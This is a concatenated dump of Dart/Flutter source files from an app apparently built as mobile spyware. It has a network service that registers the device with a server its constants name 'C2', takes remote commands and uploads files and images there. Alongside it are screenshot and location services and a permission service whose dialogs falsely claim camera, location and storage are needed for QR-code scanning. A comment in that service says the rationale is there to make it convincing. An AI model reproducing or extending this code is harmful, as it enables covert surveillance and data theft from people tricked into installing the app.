        "LocationService (geolocator): خطأ PlatformException أثناء الحصول على الموقع: ${e.code} - ${e.message}",
      );
      return null;
    } on LocationServiceDisabledException catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ LocationServiceDisabledException: ${e.toString()}",
      );
      return null;
    } on TimeoutException catch (e) {
      // Now TimeoutException is recognized
      debugPrint(
        "LocationService (geolocator): انتهت مهلة الحصول على الموقع: ${e.message}",
      );
      return null;
    } catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ غير متوقع أثناء الحصول على الموقع: $e",
      );
      return null;
    }
  }
}



// ------------------------------ نهاية الملف: location_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: network_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\network_service.dart
// ----------------------------------------------------------------------

// lib/services/network_service.dart
import 'dart:async';
import 'dart:convert'; // لتحويل json
import 'dart:io'; // لاستخدام File

import 'package:camera/camera.dart' show XFile; // لاستخدام XFile
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart'
    as sio; // Socket.IO Client

import '../config/app_config.dart'; // للوصول إلى URLs والثوابت
import '../core/logging/enhanced_logger_service.dart'; // استخدام المسجل المحسن
import '../utils/constants.dart'; // للوصول إلى أسماء الأحداث ونقاط النهاية

class NetworkService {
  sio.Socket? _socket;
  final EnhancedLoggerService _logger =
      EnhancedLoggerService(); // استخدام المسجل المحسن مباشرة
  int _reconnectAttempts = 0;
  Timer? _reconnectTimer;
  Timer? _heartbeatTimer;
  bool _isReconnecting = false;
  String? _lastConnectedDeviceId; // لتخزين آخر deviceId تم الاتصال به

  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast();
  Stream<bool> get connectionStatusStream => _connectionStatusController.stream;

  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast();
  Stream<Map<String, dynamic>> get commandStream => _commandController.stream;

  bool get isSocketConnected => _socket?.connected ?? false;

  NetworkService() {
    _logger.info("NetworkService", "NetworkService instance created.");
  }

  void _initializeSocket(String deviceIdForConnection) {
    _lastConnectedDeviceId = deviceIdForConnection; // حفظ deviceId

    if (_socket != null) {
      // إذا كان هناك socket موجود، تخلص منه أولاً
      _logger.info("NetworkService:_initializeSocket",
          "Disposing existing socket before creating a new one.");
      _socket!.dispose();
      _socket = null;
    }

    _logger.info("NetworkService:_initializeSocket",
        "Initializing Socket.IO to $C2_SOCKET_IO_URL for Device ID: $deviceIdForConnection");
    try {
      _socket = sio.io(C2_SOCKET_IO_URL, <String, dynamic>{
        'transports': ['websocket', 'polling'],
        'autoConnect': false,
        'forceNew': true, // ضمان إنشاء اتصال جديد
        'reconnection': true, // تمكين إعادة الاتصال التلقائي من المكتبة
        'reconnectionAttempts': C2_SOCKET_IO_RECONNECT_ATTEMPTS > 0
            ? C2_SOCKET_IO_RECONNECT_ATTEMPTS
            : 5, // استخدام الثابت أو قيمة افتراضية
        'reconnectionDelay': C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds,
        'reconnectionDelayMax':
            C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds * 5, // مثال لحد أقصى
        'timeout': 20000, // مهلة الاتصال بالمللي ثانية
        'query': {
          'deviceId':
              deviceIdForConnection, // إرسال deviceId كـ query parameter
          'clientType': APP_NAME, // اسم التطبيق
          'timestamp': DateTime.now().millisecondsSinceEpoch.toString(),
          'version': '1.0.0', // إصدار التطبيق (مثال)
        },
        // 'auth': { 'token': 'your_optional_auth_token_here' } // إذا كنت تستخدم مصادقة عبر token
      });

      _socket!.onConnect((_) {
        _logger.info("NetworkService:Events",
            "Socket.IO Connected! SID: ${_socket?.id}, Device ID: $deviceIdForConnection");
        _connectionStatusController.add(true);
        _reconnectAttempts = 0;
        _isReconnecting = false;
        _stopReconnectTimer(); // إيقاف أي مؤقتات إعادة اتصال قديمة
        _startHeartbeat(); // بدء نبضات القلب عند الاتصال
        // إعلام background_service بأن الاتصال تم (سيقوم هو بطلب التسجيل)
      });

      _socket!.onDisconnect((reason) {
        _logger.warn("NetworkService:Events",
            "Socket.IO Disconnected. Reason: $reason. Device ID: $_lastConnectedDeviceId");
        _connectionStatusController.add(false);
        _stopHeartbeat(); // إيقاف نبضات القلب
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          // التأكد من وجود deviceId لإعادة الاتصال
          _scheduleReconnect(); // جدولة إعادة الاتصال
        }
      });

      _socket!.onConnectError((error) {
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Connection Error. Device ID: $_lastConnectedDeviceId",
            error);
        _connectionStatusController.add(false);
        _stopHeartbeat();
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          _scheduleReconnect();
        }
      });

      _socket!.onError((error) {
        // أخطاء عامة في الـ socket
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Generic Error. Device ID: $_lastConnectedDeviceId",
            error);
        // قد ترغب في التعامل مع هذا بشكل مختلف، ربما لا يتطلب إعادة اتصال فوري
      });

      // الاستماع للحدث الموحد للأوامر من الخادم
      _socket!.on('command', (data) {
        if (data is Map) {
          final String? commandName = data['command'] as String?;
          final Map<String, dynamic> args = data['args'] is Map
              ? Map<String, dynamic>.from(data['args'])
              : {};
          final String? commandId =
              data['command_id'] as String?; // استقبال معرّف الأمر

          if (commandName != null) {
            _logger.info("NetworkService:CommandListener",
                "Received unified command '$commandName' (ID: ${commandId ?? "N/A"}) from C2 with args: $args. Device ID: $_lastConnectedDeviceId");
            _commandController.add({
              'command': commandName,
              'command_id': commandId, // تمرير command_id
              'args': args,
            });
          } else {
            _logger.warn("NetworkService:CommandListener",
                "Received command with null name. Data: $data. Device ID: $_lastConnectedDeviceId");
          }
        } else {
          _logger.warn("NetworkService:CommandListener",
              "Received malformed command data (not a Map): $data. Device ID: $_lastConnectedDeviceId");
        }
      });

      // الاستماع لحدث طلب التسجيل من الخادم
      _socket!.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REQUEST_REGISTRATION_INFO' from C2. Device ID: $_lastConnectedDeviceId");
        // إرسال هذا كأمر داخلي للخدمة الخلفية للقيام بالتسجيل
        _commandController.add({
          'command':
              SIO_EVENT_REQUEST_REGISTRATION_INFO, // استخدام نفس اسم الحدث كمعرف للأمر الداخلي
          'command_id':
              'server_request_reg_${DateTime.now().millisecondsSinceEpoch}',
          'args': {},
        });
      });

      // الاستماع لحدث نجاح التسجيل من الخادم (اختياري، للتسجيل فقط)
      _socket!.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REGISTRATION_SUCCESSFUL' from C2. Data: $data. Device ID: $_lastConnectedDeviceId");
        // يمكن القيام بأي إجراءات إضافية هنا إذا لزم الأمر بعد تأكيد التسجيل
      });
    } catch (e, stackTrace) {
      _logger.error(
          "NetworkService:_initializeSocket",
          "Exception during Socket.IO instance creation or event listener setup. Device ID: $deviceIdForConnection",
          e,
          stackTrace);
      _connectionStatusController.add(false);
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect(); // محاولة إعادة الاتصال إذا فشلت التهيئة
      }
    }
  }

  Future<void> connectSocketIO(String deviceIdToConnectWith) async {
    if (_socket == null || _lastConnectedDeviceId != deviceIdToConnectWith) {
      // إذا لم يتم تهيئة الـ socket أو تغير deviceId، قم بالتهيئة
      _logger.info("NetworkService:connectSocketIO",
          "Socket not initialized or deviceId changed. Initializing for $deviceIdToConnectWith.");
      _initializeSocket(deviceIdToConnectWith);
    }

    if (_socket != null && !_socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Attempting to connect socket for Device ID: $deviceIdToConnectWith...");
      _socket!.connect();
      // لا حاجة لـ Future.delayed هنا، معالجات الأحداث ستتعامل مع النجاح/الفشل
    } else if (_socket != null && _socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Socket already connected for Device ID: $deviceIdToConnectWith. SID: ${_socket?.id}");
      // التأكد من أن حالة الاتصال مُرسلة بشكل صحيح
      if (!_connectionStatusController.isClosed &&
          _connectionStatusController.hasListener) {
        _connectionStatusController.add(true);
      }
      _startHeartbeat(); // تأكد من أن نبضات القلب تعمل
    } else {
      _logger.error("NetworkService:connectSocketIO",
          "Socket is unexpectedly null after initialization attempt for Device ID: $deviceIdToConnectWith.");
      // محاولة إعادة التهيئة والاتصال مرة أخرى كإجراء احتياطي
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect();
      }
    }
  }

  void _scheduleReconnect() {
    if (_isReconnecting || _lastConnectedDeviceId == null) {
      _logger.info("NetworkService:_scheduleReconnect",
          "Reconnect already in progress or no deviceId to reconnect with. Skipping.");
      return;
    }
    _isReconnecting = true;
    _reconnectAttempts++;

    _stopReconnectTimer(); // إيقاف المؤقت الحالي إذا كان موجودًا

    final int delaySeconds =
        (_reconnectAttempts * C2_SOCKET_IO_RECONNECT_DELAY.inSeconds).clamp(
            C2_SOCKET_IO_RECONNECT_DELAY.inSeconds,
            60); // تأخير متزايد بحد أقصى

    _logger.info("NetworkService:_scheduleReconnect",
        "Scheduling reconnect attempt #${_reconnectAttempts} in $delaySeconds seconds for Device ID: $_lastConnectedDeviceId.");
    _reconnectTimer = Timer(Duration(seconds: delaySeconds), () {
      if (_lastConnectedDeviceId != null) {
        // تحقق مرة أخرى قبل الاتصال
        _logger.info("NetworkService:_scheduleReconnect",
            "Executing reconnect attempt #$_reconnectAttempts for Device ID: $_lastConnectedDeviceId.");
        connectSocketIO(
            _lastConnectedDeviceId!); // محاولة الاتصال بالـ deviceId المحفوظ
      } else {
        _logger.warn("NetworkService:_scheduleReconnect",
            "Cannot execute reconnect, _lastConnectedDeviceId is null.");
        _isReconnecting =
            false; // السماح بمحاولات مستقبلية إذا أصبح deviceId متاحًا
      }
    });
  }

  void _stopReconnectTimer() {
    _reconnectTimer?.cancel();
    _reconnectTimer = null;
  }

  void _startHeartbeat() {
    if (_lastConnectedDeviceId == null) {
      _logger.warn("NetworkService:_startHeartbeat",
          "Cannot start heartbeat, _lastConnectedDeviceId is null.");
      return;
    }
    _stopHeartbeat(); // إيقاف أي مؤقت نبضات قلب سابق

    _logger.info("NetworkService:_startHeartbeat",
        "Starting heartbeat with interval ${C2_HEARTBEAT_INTERVAL.inSeconds} seconds for Device ID: $_lastConnectedDeviceId.");
    _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
      if (isSocketConnected && _lastConnectedDeviceId != null) {
        _logger.debug("NetworkService:HeartbeatTimer",
            "Sending heartbeat for Device ID: $_lastConnectedDeviceId.");
        sendHeartbeat({
          'deviceId': _lastConnectedDeviceId!,
          'timestamp': DateTime.now().toIso8601String()
        });
      } else {
        _logger.warn("NetworkService:HeartbeatTimer",
            "Cannot send heartbeat - socket not connected or no deviceId. Stopping heartbeat. Device ID: $_lastConnectedDeviceId");
        _stopHeartbeat(); // إيقاف نبضات القلب
        // إعادة الاتصال ستتم معالجتها بواسطة onDisconnect أو Watchdog
      }
    });
  }

  void _stopHeartbeat() {
    if (_heartbeatTimer != null) {
      _logger.info("NetworkService:_stopHeartbeat",
          "Stopping heartbeat. Device ID: $_lastConnectedDeviceId");
      _heartbeatTimer!.cancel();
      _heartbeatTimer = null;
    }
  }

  void disconnectSocketIO() {
    _logger.info("NetworkService:disconnectSocketIO",
        "Disconnecting and disposing Socket.IO. Device ID: $_lastConnectedDeviceId");
    _stopHeartbeat();
    _stopReconnectTimer(); // إيقاف أي محاولات إعادة اتصال مجدولة
    _isReconnecting = false; // إعادة تعيين حالة إعادة الاتصال

    if (_socket != null) {
      if (_socket!.connected) {
        _socket!.disconnect();
      }
      _socket!.dispose(); // التخلص من الـ socket بشكل كامل
      _socket = null;
    }
    // لا تغلق _connectionStatusController هنا، قد يتم إعادة استخدامه
    // _commandController أيضاً
    _logger.info("NetworkService:disconnectSocketIO",
        "Socket.IO resources released for Device ID: $_lastConnectedDeviceId.");
  }

  void registerDeviceWithC2(Map<String, dynamic> deviceInfoPayload) {
    if (isSocketConnected) {
      // التأكد من أن الحمولة تحتوي على deviceId
      if (!deviceInfoPayload.containsKey('deviceId') ||
          (deviceInfoPayload['deviceId'] as String?)?.isEmpty == true) {
        deviceInfoPayload['deviceId'] =
            _lastConnectedDeviceId ?? 'unknown_fallback_id_in_reg';
        _logger.warn("NetworkService:registerDeviceWithC2",
            "deviceId was missing in payload, added: ${deviceInfoPayload['deviceId']}");
      }
      _logger.info("NetworkService:registerDeviceWithC2",
          "Sending '$SIO_EVENT_REGISTER_DEVICE' with payload for Device ID: ${deviceInfoPayload['deviceId']}. Payload: ${jsonEncode(deviceInfoPayload)}");
      _socket!.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfoPayload);
    } else {
      _logger.warn("NetworkService:registerDeviceWithC2",
          "Cannot register device. Socket not connected. Device ID: $_lastConnectedDeviceId");
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect(); // محاولة إعادة الاتصال إذا لم يكن متصلاً
      }
    }
  }

  void sendHeartbeat(Map<String, dynamic> heartbeatPayload) {
    if (isSocketConnected) {
      _logger.debug("NetworkService:sendHeartbeat",
          "Sending '$SIO_EVENT_DEVICE_HEARTBEAT' for Device ID: ${heartbeatPayload['deviceId']}");
      _socket!.emit(SIO_EVENT_DEVICE_HEARTBEAT, heartbeatPayload);
    } else {
      _logger.warn("NetworkService:sendHeartbeat",
          "Cannot send heartbeat. Socket not connected. Device ID: ${heartbeatPayload['deviceId']}");
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    String? commandId, // معرّف الأمر الفريد
    required String status,
    dynamic payload,
  }) {
    if (isSocketConnected) {
      final response = {
        'command': originalCommand,
        'command_id': commandId ??
            'client_generated_${DateTime.now().millisecondsSinceEpoch}', // معرّف احتياطي إذا كان فارغًا
        'status': status,
        'payload': payload ?? {},
        'timestamp_response_utc': DateTime.now().toUtc().toIso8601String(),
        'deviceId': _lastConnectedDeviceId ??
            'unknown_id_in_resp' // إضافة deviceId للاستجابة
      };
      _logger.info("NetworkService:sendCommandResponse",
          "Sending '$SIO_EVENT_COMMAND_RESPONSE' for command '$originalCommand' (ID: ${response['command_id']}) with status '$status'. Device ID: ${response['deviceId']}");
      _socket!.emit(SIO_EVENT_COMMAND_RESPONSE, response);
    } else {
      _logger.warn("NetworkService:sendCommandResponse",
          "Cannot send command response for '$originalCommand'. Socket not connected. Device ID: $_lastConnectedDeviceId");
    }
  }

  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_INITIAL_DATA);
    _logger.info("NetworkService:sendInitialData",
        "Sending initial data to: $url. Device ID from JSON: ${jsonData['deviceId']}");

    try {
      var request = http.MultipartRequest('POST', url);
      // التأكد من أن deviceId موجود في jsonData
      if (!jsonData.containsKey('deviceId') ||
          (jsonData['deviceId'] as String?)?.isEmpty == true) {
        jsonData['deviceId'] = _lastConnectedDeviceId ?? 'fallback_initial_id';
        _logger.warn("NetworkService:sendInitialData",
            "deviceId was missing in jsonData, added: ${jsonData['deviceId']}");
      }
      request.fields['json_data'] = jsonEncode(jsonData);

      if (imageFile != null) {
        _logger.info("NetworkService:sendInitialData",
            "Attaching initial image file: ${imageFile.name} (Path: ${imageFile.path})");
        final file = File(imageFile.path);
        if (await file.exists()) {
          request.files.add(await http.MultipartFile.fromPath(
            'image', // اسم الحقل المتوقع من الخادم
            imageFile.path,
            filename: imageFile.name,
          ));
          _logger.info("NetworkService:sendInitialData",
              "Initial image file '${imageFile.name}' attached successfully.");
        } else {
          _logger.warn("NetworkService:sendInitialData",
              "Initial image file does NOT exist at path: ${imageFile.path}. Skipping attachment.");
        }
      } else {
        _logger.info("NetworkService:sendInitialData",
            "No initial image file provided to attach.");
      }

      var response = await request
          .send()
          .timeout(const Duration(seconds: 45)); // زيادة المهلة قليلاً
      final responseBody = await response.stream.bytesToString();
      _logger.info("NetworkService:sendInitialData",
          "Server Response Status Code: ${response.statusCode}. Body: $responseBody");

      if (response.statusCode >= 200 && response.statusCode < 300) {
        _logger.info("NetworkService:sendInitialData",
            "Initial data sent successfully to C2 server.");
        return true;
      } else {
        _logger.error("NetworkService:sendInitialData",
            "Failed to send initial data. Status Code: ${response.statusCode}, Body: $responseBody");
        return false;
      }
    } on TimeoutException catch (e, s) {
      _logger.error("NetworkService:sendInitialData",
          "Timeout sending initial data", e, s);
      return false;
    } catch (e, s) {
      _logger.error("NetworkService:sendInitialData",
          "Network Error sending initial data", e, s);
      return false;
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId, // المعرف الفعلي للجهاز
    required String commandRef,
    String? commandId, // معرّف الأمر الفريد
    required XFile fileToUpload,
    String fieldName = 'file',
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_COMMAND_FILE);
    _logger.info("NetworkService:uploadFileFromCommand",
        "Uploading command file '${fileToUpload.name}' to: $url for Device ID: $deviceId, Command Ref: '$commandRef' (ID: ${commandId ?? "N/A"})");

    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['deviceId'] = deviceId; // إرسال deviceId الصحيح
      request.fields['commandRef'] = commandRef;
      if (commandId != null) {
        request.fields['commandId'] =
            commandId; // إرسال commandId إذا كان متاحًا
      }

      _logger.info("NetworkService:uploadFileFromCommand",
          "Attaching command file: ${fileToUpload.path}, name: ${fileToUpload.name}");
      final file = File(fileToUpload.path);
      if (await file.exists()) {
        request.files.add(await http.MultipartFile.fromPath(
          fieldName, // اسم الحقل المتوقع 'file'
          fileToUpload.path,
          filename: fileToUpload.name,
        ));
        _logger.info("NetworkService:uploadFileFromCommand",
            "Command file '${fileToUpload.name}' attached successfully.");
      } else {
        _logger.error("NetworkService:uploadFileFromCommand",
            "Command file does NOT exist at path: ${fileToUpload.path}");
        // إرسال استجابة خطأ عبر Socket.IO لأن رفع الملف فشل من جانب العميل
        sendCommandResponse(
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            'message':
                'File to upload not found on device at path ${fileToUpload.path}'
          },
        );
        return false;
      }

      var response = await request
          .send()
          .timeout(const Duration(seconds: 90)); // زيادة المهلة للملفات الأكبر
      final responseBody = await response.stream.bytesToString();
      _logger.info("NetworkService:uploadFileFromCommand",
          "Command file upload - Server Response Status Code: ${response.statusCode}. Body: $responseBody");

      if (response.statusCode >= 200 && response.statusCode < 300) {
        _logger.info("NetworkService:uploadFileFromCommand",
            "Command file '${fileToUpload.name}' uploaded successfully.");
        // إرسال استجابة نجاح عبر Socket.IO
        sendCommandResponse(
          originalCommand: commandRef,
          commandId: commandId,
          status: 'success',
          payload: {
            'message': 'File ${fileToUpload.name} uploaded successfully to C2.',
            'filename_on_server':
                responseBody, // افتراض أن الخادم يعيد اسم الملف أو تأكيدًا
          },
        );
        return true;
      } else {
        _logger.error("NetworkService:uploadFileFromCommand",
            "Failed to upload command file '${fileToUpload.name}'. Status Code: ${response.statusCode}, Body: $responseBody");
        sendCommandResponse(
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            'message':
                'Failed to upload file ${fileToUpload.name} to C2. Server status: ${response.statusCode}',
            'response_body': responseBody,
          },
        );
        return false;
      }
    } on TimeoutException catch (e, s) {
      _logger.error("NetworkService:uploadFileFromCommand",
          "Timeout uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          'message': 'Timeout uploading file ${fileToUpload.name} to C2.'
        },
      );
      return false;
    } catch (e, s) {
      _logger.error("NetworkService:uploadFileFromCommand",
          "Network Error uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          'message':
              'Exception uploading file ${fileToUpload.name} to C2: ${e.toString()}'
        },
      );
      return false;
    }
  }

  void dispose() {
    _logger.info("NetworkService:dispose",
        "Disposing NetworkService resources. Device ID: $_lastConnectedDeviceId");
    disconnectSocketIO(); // يتضمن إيقاف المؤقتات والتخلص من الـ socket
    _connectionStatusController.close();
    _commandController.close();
    _logger.info("NetworkService:dispose",
        "All NetworkService resources have been released.");
  }
}



// ------------------------------ نهاية الملف: network_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: permission_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\permission_service.dart
// ----------------------------------------------------------------------

// lib/services/permission_service.dart
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/material.dart';

class PermissionService {
  // قائمة الأذونات المطلوبة
  final List<Permission> _requiredPermissions = [
    Permission.camera,
    Permission
        .locationWhenInUse, // أو locationAlways إذا كانت هناك حاجة حقيقية لذلك
    Permission
        .storage, // ملاحظة: هذا قد يتصرف بشكل مختلف في Android 11+ (Scoped Storage)
    // بدائل لـ storage في Android 13+:
    // Permission.photos, // للوصول لمعرض الصور
    // Permission.manageExternalStorage, // صلاحية قوية جداً ونادرة الاستخدام
  ];

  /// يطلب جميع الأذونات المطلوبة بطريقة متسلسلة.
  /// يعرض حوار توضيحي قبل طلب كل إذن حساس.
  Future<bool> requestRequiredPermissions(BuildContext context) async {
    Map<Permission, PermissionStatus> statuses = {};

    for (var permission in _requiredPermissions) {
      var status = await permission.status;
      if (!status.isGranted) {
        // عرض سبب طلب الإذن للمستخدم (لجعله مقنعاً)
        bool showRationale = await _showPermissionRationale(
          context,
          permission,
        );
        if (!showRationale) {
          // المستخدم رفض عرض التبرير، نفترض أنه لا يريد منح الإذن
          debugPrint("User declined rationale for $permission");
          return false;
        }

        // طلب الإذن الفعلي
        status = await permission.request();
      }
      statuses[permission] = status;
      debugPrint("Permission $permission status: $status");

      // إذا تم رفض الإذن بشكل دائم، لا فائدة من المتابعة
      if (status.isPermanentlyDenied) {
        debugPrint("Permission $permission permanently denied.");
        _showAppSettingsDialog(
          context,
          permission,
        ); // نقترح على المستخدم فتح الإعدادات
        return false;
      }

      // إذا تم رفض أي إذن أساسي، نعتبر العملية فاشلة
      if (!status.isGranted) {
        debugPrint("Permission $permission denied.");
        return false;
      }
    }

    // التحقق النهائي من أن كل شيء تم منحه
    return statuses.values.every((status) => status.isGranted);
  }

  /// يتحقق مما إذا كانت جميع الأذونات المطلوبة ممنوحة بالفعل.
  Future<bool> checkPermissions() async {
    for (var permission in _requiredPermissions) {
      if (!(await permission.status.isGranted)) {
        return false;
      }
    }
    return true;
  }

  /// يعرض رسالة توضيحية للمستخدم قبل طلب إذن حساس.
  Future<bool> _showPermissionRationale(
    BuildContext context,
    Permission permission,
  ) async {
    String title;
    String content;

    switch (permission) {
      case Permission.camera:
        title = 'إذن استخدام الكاميرا';
        content = 'نحتاج للوصول إلى الكاميرا لمسح أكواد QR وتحليلها بدقة.';
        break;
      case Permission.locationWhenInUse:
      case Permission.locationAlways:
        title = 'إذن تحديد الموقع';
        content =
            'يساعدنا تحديد موقعك الجغرافي في تحديد مكان مسح الكود بدقة أكبر، مما قد يكون مفيداً في بعض أنواع الأكواد المرتبطة بمواقع معينة.';
        break;
      case Permission.storage:
        title = 'إذن الوصول للتخزين';
        content =
            'نحتاج إذن الوصول للتخزين لحفظ صور أكواد QR التي تم مسحها أو أي بيانات مرتبطة بها قد ترغب في الاحتفاظ بها.';
        break;
      // أضف حالات أخرى إذا لزم الأمر
      default:
        return true; // لا يوجد تبرير خاص مطلوب
    }

    // التأكد من أن context لا يزال صالحاً قبل عرض الـ Dialog
    if (!context.mounted) return false;

    return await showDialog<bool>(
          context: context,
          barrierDismissible: false, // يجب على المستخدم اتخاذ قرار
          builder:
              (BuildContext dialogContext) => AlertDialog(
                title: Text(title),
                content: Text(content),
                actions: <Widget>[
                  TextButton(
                    child: const Text('لاحقاً'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(false), // المستخدم يرفض الآن
                  ),
                  TextButton(
                    child: const Text('السماح'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(true), // المستخدم يوافق على المتابعة
                  ),
                ],
              ),
        ) ??
        false; // إذا أغلق الحوار بطريقة أخرى، اعتبره رفضاً
  }

  // يعرض حوار يقترح على المستخدم فتح إعدادات التطبيق لتغيير الإذن
  void _showAppSettingsDialog(BuildContext context, Permission permission) {
    if (!context.mounted) return;
    showDialog(
      context: context,
      builder:
          (BuildContext context) => AlertDialog(
            title: Text('الإذن مرفوض نهائياً'),
            content: Text(
              'لقد رفضت إذن ${permission.toString().split('.').last} بشكل دائم. يرجى التوجه إلى إعدادات التطبيق لتفعيله يدوياً إذا أردت استخدام هذه الميزة.',
            ),
            actions: <Widget>[
              TextButton(
                child: const Text('إلغاء'),
                onPressed: () => Navigator.of(context).pop(),
              ),
              TextButton(
                child: const Text('فتح الإعدادات'),
                onPressed: () {
                  openAppSettings(); // تفتح إعدادات التطبيق
                  Navigator.of(context).pop();
                },
              ),
            ],
          ),
    );
  }
}



// ------------------------------ نهاية الملف: permission_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: screenshot_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\screenshot_service.dart
// ----------------------------------------------------------------------

// lib/services/screenshot_service.dart
import 'dart:io';
import 'dart:typed_data';
import 'dart:ui' as ui;

import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:image/image.dart' as img; // <-- إضافة مكتبة image
import 'package:path_provider/path_provider.dart';

class ScreenshotService {
  final GlobalKey screenshotKey;
  final Function(String) onLogEvent;

  ScreenshotService({
    required this.screenshotKey,
    required this.onLogEvent,
  });

  Future<Uint8List?> captureScreenshot({double pixelRatio = 3.0}) async {
    // جعل pixelRatio معاملاً
    try {
      await Future.delayed(const Duration(milliseconds: 200)); // زيادة التأخير

      if (screenshotKey.currentContext == null) {
        onLogEvent('Screenshot Error: GlobalKey context is null.');
        return null;
      }

      RenderRepaintBoundary? boundary = screenshotKey.currentContext
          ?.findRenderObject() as RenderRepaintBoundary?;
      if (boundary == null) {
        onLogEvent('خطأ: لم يتم العثور على RepaintBoundary.');
        return null;
      }

      ui.Image image = await boundary.toImage(pixelRatio: pixelRatio);
      ByteData? byteData = await image.toByteData(
          format: ui.ImageByteFormat.png); // الصور الملتقطة تكون PNG عادة
      image.dispose();

      if (byteData == null) {
        onLogEvent('خطأ: فشل تحويل الصورة إلى بيانات');
        return null;
      }
      onLogEvent('تم التقاط لقطة الشاشة (PNG الخام) بنجاح بدقة $pixelRatio');
      return byteData.buffer.asUint8List();
    } catch (e, stackTrace) {
      onLogEvent('خطأ في التقاط الشاشة: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // دالة جديدة لضغط الصورة
  Future<Uint8List?> compressImage(Uint8List pngBytes,
      {int quality = 75}) async {
    try {
      onLogEvent('Compressing image...');
      img.Image? image = img.decodeImage(pngBytes); // فك تشفير الـ PNG
      if (image == null) {
        onLogEvent('Compression Error: Could not decode PNG bytes.');
        return null;
      }
      // تحويل إلى JPEG مع تحديد الجودة (75 كقيمة افتراضية جيدة)
      List<int> jpgBytes = img.encodeJpg(image, quality: quality);
      onLogEvent(
          'Image compressed to JPEG with quality $quality. Original size: ${pngBytes.lengthInBytes}, Compressed size: ${jpgBytes.length}');
      return Uint8List.fromList(jpgBytes);
    } catch (e, stackTrace) {
      onLogEvent('Compression Error: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // تعديل saveScreenshotToFile ليقبل امتدادًا مختلفًا
  Future<String?> saveScreenshotToFile(Uint8List imageBytes,
      {String extension = 'png'}) async {
    try {
      final directory = await getTemporaryDirectory();
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      // استخدام الامتداد المعطى
      final filePath = '${directory.path}/screenshot_$timestamp.$extension';
      final file = File(filePath);
      await file.writeAsBytes(imageBytes);
      onLogEvent('تم حفظ لقطة الشاشة في: $filePath');
      return filePath;
    } catch (e) {
      onLogEvent('خطأ في حفظ لقطة الشاشة: $e');
      return null;
    }
  }

  Future<String?> captureAndSaveScreenshot(
      {double pixelRatio = 3.0,
      bool compress = false,
      int quality = 75,
      String targetExtension = 'png'}) async {
    Uint8List? imageBytes = await captureScreenshot(pixelRatio: pixelRatio);
    if (imageBytes != null) {
      if (compress && targetExtension == 'jpg') {
        final compressedBytes =
            await compressImage(imageBytes, quality: quality);
        if (compressedBytes != null) {
          return await saveScreenshotToFile(compressedBytes, extension: 'jpg');
        } else {
          onLogEvent('Failed to compress image, saving original.');
          return await saveScreenshotToFile(imageBytes,
              extension: 'png'); // حفظ الأصلي إذا فشل الضغط
        }
      }
      return await saveScreenshotToFile(imageBytes, extension: targetExtension);
    }
    return null;
  }

  // ... (captureHighQualityScreenshot, captureLowQualityScreenshot يمكن تعديلها أو إزالتها إذا لم تعد مستخدمة)
}



// ------------------------------ نهاية الملف: screenshot_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: constants.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\constants.dart
// ----------------------------------------------------------------------

// lib/utils/constants.dart

// --- SharedPreferences Keys ---
const String PREF_INITIAL_DATA_SENT = 'initialDataSent';
const String PREF_DEVICE_ID = 'pref_device_id'; // لحفظ مُعرف الجهاز الفريد

// --- Background Service Events (Flutter internal) ---
const String BG_SERVICE_EVENT_SEND_INITIAL_DATA = 'sendInitialData';
const String BG_SERVICE_EVENT_STOP_SERVICE = 'stopService';

